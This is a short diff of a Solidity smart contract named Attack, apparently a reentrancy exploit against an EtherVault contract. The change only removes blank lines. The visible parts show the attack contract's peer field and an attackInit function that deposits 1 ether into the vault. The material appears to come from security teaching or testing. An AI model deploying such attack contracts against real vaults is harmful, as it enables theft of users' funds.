@@ -18,9 +18,6 @@ interface IEtherVault {
 } 
 
 contract Attack {
-
-
-
     IEtherVault public immutable etherVault;
     Attack public attackPeer;
 
@@ -39,7 +36,6 @@ contract Attack {
             );
         }
     }
-
     function attackInit() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         etherVault.deposit{value: 1 ether}();
